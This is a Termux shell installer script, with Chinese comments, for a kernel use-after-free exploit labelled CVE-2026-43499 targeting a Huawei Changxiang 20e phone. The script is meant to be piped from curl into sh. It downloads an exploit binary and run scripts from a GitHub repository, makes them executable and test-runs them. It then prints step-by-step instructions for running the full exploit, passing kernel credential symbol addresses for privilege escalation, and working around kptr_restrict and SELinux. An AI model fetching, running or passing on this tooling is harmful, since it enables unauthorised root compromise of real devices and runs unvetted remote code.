#!/data/data/com.termux/files/usr/bin/sh
# ============================================================
# CVE-2026-43499 Termux 一键安装脚本
# 在 Termux 中运行: curl -sL <URL> | sh
# 或: pkg install curl && curl -sL <URL> | sh
# ============================================================

set -e

REPO_URL="https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499"
INSTALL_DIR="$HOME/cve_2026_43499"

echo ""
echo "============================================"
echo " CVE-2026-43499 Termux 安装器"
echo " 目标: Huawei Changxiang 20e (MT6765)"
echo "============================================"
echo ""

# 检查 Termux 环境
if [ ! -d "/data/data/com.termux" ]; then
    echo "[-] 错误: 请在 Termux 中运行此脚本"
    exit 1
fi

echo "[*] Termux 环境: $PREFIX"
echo "[*] Home: $HOME"

# 安装 curl (如果没有)
if ! command -v curl >/dev/null 2>&1; then
    echo "[*] 安装 curl..."
    pkg install -y curl 2>/dev/null || {
        echo "[-] 无法安装 curl, 请手动运行: pkg install curl"
        exit 1
    }
fi

# 安装 wget 作为后备
if ! command -v wget >/dev/null 2>&1; then
    echo "[*] 安装 wget (后备)..."
    pkg install -y wget 2>/dev/null
fi

# 创建安装目录
mkdir -p "$INSTALL_DIR"
cd "$INSTALL_DIR"

echo "[*] 安装目录: $INSTALL_DIR"
echo ""

# 下载文件
download_file() {
    local file="$1"
    local url="$REPO_URL/$file"
    echo "[*] 下载 $file ..."
    if command -v curl >/dev/null 2>&1; then
        curl -sL -o "$file" "$url" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -q -O "$file" "$url" 2>/dev/null
    fi
    
    if [ -f "$file" ] && [ -s "$file" ]; then
        local size=$(wc -c < "$file")
        echo "  [+] $file ($size bytes)"
        return 0
    else
        echo "  [-] 下载失败: $file"
        rm -f "$file"
        return 1
    fi
}

echo "=== 下载文件 ==="
echo ""

FAIL=0

# 下载 exploit 二进制
if ! download_file "exploit"; then
    echo "[-] exploit 二进制下载失败, 尝试完整包..."
    if download_file "exploit_package.tar.gz"; then
        echo "[*] 从完整包提取..."
        tar xzf exploit_package.tar.gz 2>/dev/null || \
            gzip -dc exploit_package.tar.gz | tar xf - 2>/dev/null
        if [ -f "exploit" ]; then
            echo "[+] 从包中提取 exploit 成功"
        else
            echo "[-] 无法从包中提取 exploit"
            FAIL=1
        fi
    else
        FAIL=1
    fi
fi

# 下载脚本和配置
download_file "run_boot.sh" || FAIL=1
download_file "run_boot10e.sh" || FAIL=1
download_file "offsets.json" || true

echo ""

if [ "$FAIL" = "1" ]; then
    echo "[-] 部分文件下载失败"
    echo "[-] 请检查网络连接"
    echo ""
    echo "手动下载方法:"
    echo "  curl -L -o exploit https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/exploit"
    echo "  curl -L -o run_boot.sh https://raw.githubusercontent.com/1332915/-10e-/main/cve_2026_43499/run_boot.sh"
    exit 1
fi

# 设置权限
echo "=== 设置权限 ==="
chmod 755 exploit 2>/dev/null && echo "[+] exploit 可执行" || echo "[-] chmod 失败"
chmod 755 run_boot.sh 2>/dev/null
chmod 755 run_boot10e.sh 2>/dev/null

# 验证 exploit 可执行
echo ""
echo "=== 验证 ==="
file exploit 2>/dev/null || echo "[*] file 命令不可用"

# 测试执行
if ./exploit 2>&1 | head -1; then
    echo "[+] exploit 可执行!"
else
    echo "[!] exploit 执行测试返回非零 (可能正常, exploit 需要参数)"
fi

echo ""
echo "============================================"
echo " [+] 安装完成!"
echo "============================================"
echo ""
echo "文件位置: $INSTALL_DIR"
echo ""
echo "=== 使用方法 ==="
echo ""
echo "1. 进入目录:"
echo "   cd ~/cve_2026_43499"
echo ""
echo "2. 查看内核版本 (确认是 ARM32 还是 ARM64):"
echo "   uname -m"
echo "   uname -r"
echo ""
echo "3. 运行 exploit:"
echo ""
echo "   如果 uname -m 显示 armv7l 或 armv8l (ARM32):"
echo "     sh run_boot.sh -t     # 先测试 UAF 是否触发"
echo "     sh run_boot.sh        # 运行完整 exploit"
echo ""
echo "   如果 uname -m 显示 aarch64 (ARM64):"
echo "     sh run_boot10e.sh -t  # 先测试"
echo "     sh run_boot10e.sh     # 运行完整 exploit"
echo ""
echo "4. 如果需要手动指定符号地址:"
echo "   sh run_boot.sh 0x<commit_creds> 0x<init_cred> 0x<null_fops> 0x<init_task>"
echo ""
echo "=== 注意事项 ==="
echo "- 先用 -t 测试模式, 确认 UAF 触发后再运行完整 exploit"
echo "- 如果设备崩溃重启, 说明漏洞存在但利用可能失败"
echo "- 检查 /proc/sys/kernel/kptr_restrict, 如果不是 0, 地址会被屏蔽"
echo "- SELinux Enforcing 模式可能阻止 exploit"
echo ""
echo "现在可以运行:"
echo "  cd ~/cve_2026_43499 && sh run_boot.sh -t"
echo ""
